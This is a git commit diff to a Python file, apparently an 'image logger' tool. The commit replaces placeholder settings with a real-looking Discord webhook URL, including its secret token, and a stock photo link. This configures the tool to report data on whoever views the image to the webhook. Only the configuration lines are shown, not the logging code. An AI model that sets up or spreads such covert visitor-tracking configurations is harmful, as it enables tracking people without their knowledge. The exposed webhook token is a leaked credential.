29bafd573ea7c4b8e0ae37a347d5bbdd7c1ecd26
TrollDeath <infotrolldeath@gmail.com>
2025-01-31 15:14:02 +0700

    Update imges.py

--- api/imges.py
+++ api/imges.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1334798569915285514/_NqkuMzJQkDAZtHg1M7bHh36zi30nfhThI-xhqMscPZYBgTAupMmFx81FfiALlROV2Yz",
+    "image": "https://www.crisisconnections.org/wp-content/uploads/2018/06/39-1024x683.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
